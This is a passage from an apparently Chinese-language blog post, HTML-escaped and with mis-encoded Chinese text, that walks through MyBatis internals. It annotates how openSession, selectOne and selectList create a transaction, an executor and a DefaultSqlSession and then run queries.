ä½ å¯ä»¥é€šè¿‡ SqlSession å®ä¾‹æ¥ç›´æ¥æ‰§è¡Œå·²æ˜ å°„çš„ SQL è¯­å¥ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqlSessionFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;openSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;BlogMapper&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapper&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BlogMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;Blog&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;blog&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;selectBlog&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¥½! æˆ‘ä»¬å¿«è¿›åˆ°&lt;del&gt;æ›¹ä¸•&lt;/del&gt;sqlSessionFactory.openSession()&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SqlSession&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;openSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;openSessionFromDataSource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDefaultExecutorType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SqlSession&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;openSessionFromDataSource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ExecutorType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;execType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TransactionIsolationLevel&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;autoCommit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Transactionäº‹åŠ¡ï¼ŒåŒ…è£…äº†ä¸€ä¸ªConnection, åŒ…å«commit,rollback,closeæ–¹æ³•
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Transaction&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;// è¿˜è®°å¾—ä¹ˆ, environmenté‡Œå°è£…äº†æˆ‘ä»¬çš„æ•°æ®æº;äº‹åŠ¡å·¥å‚;è¿˜æœ‰ç¯å¢ƒ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Environment&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;environment&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEnvironment&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;// å¾—åˆ°ä¸€ä¸ªäº‹åŠ¡å·¥å‚, å¦‚æœenvæˆ–è€…envé‡Œçš„äº‹åŠ¡å·¥å‚æ˜¯ç©ºçš„å°±è¿”å›ä¸€ä¸ªæ‰˜ç®¡äº‹åŠ¡å·¥å‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// æ‰˜ç®¡äº‹åŠ¡å·¥å‚çš„ç‰¹ç‚¹å°±æ˜¯æ¯æ¬¡æ‰§è¡Œå®ŒæˆSQLéƒ½ä¼šå…³é—­è¿æ¥, å¦‚æœä½ ä¸å¸Œæœ›å…³é—­è¿æ¥è¦åœ¨é…ç½®æ–‡ä»¶é‡Œè®¾ç½®å®ƒ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TransactionFactory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transactionFactory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getTransactionFactoryFromEnvironment&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;environment&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//é€šè¿‡äº‹åŠ¡å·¥å‚æ¥äº§ç”Ÿä¸€ä¸ªäº‹åŠ¡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;tx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transactionFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newTransaction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;environment&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDataSource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;autoCommit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//ç”Ÿæˆä¸€ä¸ªæ‰§è¡Œå™¨(äº‹åŠ¡åŒ…å«åœ¨æ‰§è¡Œå™¨é‡Œ)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Executor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newExecutor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;execType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//ç„¶åäº§ç”Ÿä¸€ä¸ªDefaultSqlSession
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DefaultSqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;autoCommit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//å¦‚æœæ‰“å¼€äº‹åŠ¡å‡ºé”™ï¼Œåˆ™å…³é—­å®ƒ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;closeTransaction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// may have fetched a connection so lets call close()
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExceptionFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;wrapException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Error opening session.  Cause: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;finally&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//æœ€åæ¸…ç©ºé”™è¯¯ä¸Šä¸‹æ–‡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;ErrorContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;reset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ª&lt;code&gt;SqlSession&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2020.10.12 ç»§ç»­æ›´æ–°&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æœ‰äº†&lt;code&gt;SqlSession&lt;/code&gt;ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ“ä½œæ•°æ®åº“äº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æ¥çœ‹çœ‹MyBatisæ˜¯æ€ä¹ˆå®ç°&lt;code&gt;session.selectOne(&amp;quot;org.mybatis.example.BlogMapper.selectBlog&amp;quot;, 101);&lt;/code&gt;çš„ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;T&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;selectOne&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;statement&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Popular vote was to return null on 0 results and throw exception on too many.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//è½¬è€Œå»è°ƒç”¨selectList,å¾ˆç®€å•çš„ï¼Œå¦‚æœå¾—åˆ°0æ¡åˆ™è¿”å›nullï¼Œå¾—åˆ°1æ¡åˆ™è¿”å›1æ¡ï¼Œå¾—åˆ°å¤šæ¡æŠ¥TooManyResultsExceptioné”™
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// ç‰¹åˆ«éœ€è¦ä¸»è¦çš„æ˜¯å½“æ²¡æœ‰æŸ¥è¯¢åˆ°ç»“æœçš„æ—¶å€™å°±ä¼šè¿”å›nullã€‚å› æ­¤ä¸€èˆ¬å»ºè®®åœ¨mapperä¸­ç¼–å†™resultTypeçš„æ—¶å€™ä½¿ç”¨åŒ…è£…ç±»å‹
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//è€Œä¸æ˜¯åŸºæœ¬ç±»å‹ï¼Œæ¯”å¦‚æ¨èä½¿ç”¨Integerè€Œä¸æ˜¯intã€‚è¿™æ ·å°±å¯ä»¥é¿å…NPE
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;selectList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;statement&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TooManyResultsException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Expected one result (or null) to be returned by selectOne(), but found: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

  &lt;span class=&#34;c1&#34;&gt;// emmï¼Œè¿™é‡Œå…¶å®å•¥éƒ½æ²¡æœ‰ï¼Œæˆ‘ä»¬å»SelectListçœ‹çœ‹ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
  &lt;span class=&#34;c1&#34;&gt;// åœ¨ä¸‹æ¥è§£é‡Šä¸€ä¸‹è¿™ä¸‰ä¸ªå‚æ•°ï¼š
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// statement æ˜ å°„è¯­å¥çš„ä½ç½®ï¼Œæ¯”å¦‚&amp;#34;org.mybatis.example.BlogMapper.selectBlog&amp;#34;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// parameter SQLè¯­å¥ä¸­çš„å‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// RowBounds åˆ†é¡µé™åˆ¶ï¼Œç›¸å½“äºSQLä¸­çš„limit. 
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;selectList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;statement&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RowBounds&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowBounds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//æ ¹æ®statement idæ‰¾åˆ°å¯¹åº”çš„MappedStatement
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;MappedStatement&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMappedStatement&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;statement&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//è½¬è€Œç”¨æ‰§è¡Œå™¨æ¥æŸ¥è¯¢ç»“æœ,æ³¨æ„è¿™é‡Œä¼ å…¥çš„ResultHandleræ˜¯null
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// wrapCollectionï¼šå¦‚æœå‚æ•°æ˜¯Collectionç±»å‹ï¼Œè½¬æ¢æˆMapï¼Œkeyä¸ºparameterçš„type.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wrapCollection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowBounds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Executor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;NO_RESULT_HANDLER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        
      &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExceptionFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;wrapException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Error querying database.  Cause: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;finally&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;ErrorContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;reset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;


  &lt;span class=&#34;c1&#34;&gt;// æ¥ä¸‹æ¥æ˜¯æ‰§è¡Œå™¨çš„éƒ¨åˆ†
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MappedStatement&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RowBounds&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowBounds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ResultHandler&lt;/span&gt; 